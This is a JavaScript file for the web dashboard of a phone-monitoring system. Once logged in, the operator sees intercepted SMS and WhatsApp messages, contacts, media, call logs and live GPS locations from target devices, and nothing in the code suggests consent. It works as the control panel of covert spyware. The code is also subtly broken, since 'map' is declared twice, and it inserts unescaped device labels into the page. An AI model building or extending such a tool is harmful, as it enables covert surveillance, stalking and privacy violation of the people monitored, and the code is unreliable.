// simple frontend for testing
const API_BASE = '/api';
const tokenKey = 'monitor_jwt';
const userKey = 'monitor_user';

function setLoggedIn(user, token) {
  localStorage.setItem(tokenKey, token);
  localStorage.setItem(userKey, JSON.stringify(user));
}
function logout() { localStorage.removeItem(tokenKey); localStorage.removeItem(userKey); location.reload(); }
function getToken() { return localStorage.getItem(tokenKey); }
function getUser() { return JSON.parse(localStorage.getItem(userKey) || 'null'); }

const api = {
  post: async (path, body, token) => {
    const res = await fetch(API_BASE + path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...(token?{ Authorization: 'Bearer ' + token }: {}) },
      body: JSON.stringify(body)
    });
    return res.json();
  },
  get: async (path, token) => {
    const res = await fetch(API_BASE + path, {
      headers: { ...(token?{ Authorization: 'Bearer ' + token }: {}) }
    });
    if (!res.ok) return [];
    return res.json();
  },
  download: async (path, token) => {
    const res = await fetch(API_BASE + path, { headers: { Authorization: 'Bearer ' + token }});
    if (!res.ok) {
      const txt = await res.text().catch(()=>'<no body>');
      console.error('download failed', path, res.status, txt);
      throw new Error('download failed: ' + res.status + ' ' + txt);
    }
    return res.blob();
  }
};

document.getElementById('btnLogin').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const r = await api.post('/auth/login', { username: u, password: p });
  if (r.token) { setLoggedIn(r.user, r.token); showDashboard(); } else { document.getElementById('loginMsg').innerText = r.error || 'Login failed'; }
});
document.getElementById('btnRegister').addEventListener('click', async () => {
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const r = await api.post('/auth/register', { username: u, password: p });
  document.getElementById('loginMsg').innerText = r.ok ? 'Registered, login' : (r.error || 'Register failed');
});

document.getElementById('btnLogout').addEventListener('click', logout);

let socket = null;
let map = null;

async function initSocket() {
  if (socket) return;
  const token = getToken();
  if (!token) return;
  socket = io('/', { query: { token } });

  socket.on('connect', () => console.log('socket connected'));
  socket.on('location:new', (loc) => {
    console.log('location:new', loc);
    addMarkerToMap(loc);
  });
  socket.on('media:new', (m) => { console.log('media:new', m); loadMedia(); });
  socket.on('notification:new', (n) => { console.log('notification:new', n); loadNotifs(); });
}

function showDashboard() {
  document.getElementById('loginBox').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');
  document.getElementById('btnLogout').classList.remove('hidden');
  render();
  setInterval(render, 8000);
}

async function render() {
  const token = getToken();
  if (!token) return;
  document.getElementById('userInfo').innerText = getUser() ? getUser().username : '';
  await initSocket();
  await loadDevices();
  await loadSms();
  await loadNotifs();
  await loadContacts();
  await loadMedia();
  await loadCalls();
}

async function loadDevices() {
  const token = getToken(); if (!token) return;
  const devs = await api.get('/devices', token);
  const box = document.getElementById('devicesList'); box.innerHTML = '';
  if (!devs || devs.length === 0) box.innerHTML = '<div>Nenhum dispositivo</div>';
  devs.forEach(d => {
    const el = document.createElement('div');
    const online = d.lastSeen && (Date.now() - new Date(d.lastSeen)) < 120000;
    el.innerHTML = `<strong>${d.label || d.deviceId}</strong> <span style="color:${online?'green':'red'}">${online?'●':'●'}</span><br/>LastSeen: ${d.lastSeen ? new Date(d.lastSeen).toLocaleString() : 'never'}`;
    box.appendChild(el);
  });
}

async function loadSms() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/sms', token);
  const list = document.getElementById('smsList'); list.innerHTML = '';
  arr.forEach(s => { const li = document.createElement('li'); li.textContent = `${s.sender}: ${s.message} (${new Date(s.timestamp).toLocaleString()})`; list.appendChild(li); });
}

async function loadNotifs() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/whatsapp', token);
  const list = document.getElementById('notifList'); list.innerHTML = '';
  arr.forEach(n => { const li = document.createElement('li'); li.textContent = `${n.packageName}: ${n.message} (${new Date(n.timestamp).toLocaleString()})`; list.appendChild(li); });
}

async function loadContacts() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/contacts', token);
  const list = document.getElementById('contactsList'); list.innerHTML = '';
  arr.forEach(c => { const li = document.createElement('li'); li.textContent = `${c.name} — ${c.number}`; list.appendChild(li); });
}

async function loadMedia() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/media', token);
  const list = document.getElementById('mediaList'); list.innerHTML = '';
  arr.forEach(m => {
    const li = document.createElement('li');
    const btn = document.createElement('button');
    btn.className = 'small';
    btn.textContent = 'Ver/Download';
    btn.onclick = async () => {
      try {
        const blob = await api.download('/media/' + m._id, token);
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a'); a.href = url; a.download = m.filename || 'file'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
      } catch (e) {
        console.error('download failed', e);
        alert('Download failed. Ver consola.');
      }
    };
    li.appendChild(document.createTextNode(`${m.filename || m._id} [${m.type||m.contentType}] `));
    li.appendChild(btn);
    list.appendChild(li);
  });
}

async function loadCalls() {
  const token = getToken(); if (!token) return;
  const arr = await api.get('/call', token);
  const list = document.getElementById('callsList'); list.innerHTML = '';
  arr.forEach(c => { const li = document.createElement('li'); li.textContent = `${c.number || 'unknown'} — ${c.state} (${new Date(c.timestamp).toLocaleString()})`; list.appendChild(li); });
}

// map handling
let map;
function addMarkerToMap(loc) {
  try {
    if (!map) {
      const mapDiv = document.getElementById('map');
      mapDiv.style.display = 'block';
      map = L.map('map').setView([0,0], 2);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
    }
    const lat = parseFloat(loc.lat), lon = parseFloat(loc.lon);
    if (isNaN(lat) || isNaN(lon)) return;
    const mk = L.marker([lat, lon]).addTo(map);
    mk.bindPopup(`<b>${loc.deviceId}</b><br/>${lat.toFixed(5)},${lon.toFixed(5)}<br/>${new Date(loc.timestamp).toLocaleString()}`);
    map.setView([lat, lon], 14);
  } catch (e) { console.error(e); }
}

window.addEventListener('load', () => {
  if (getToken()) showDashboard();
});

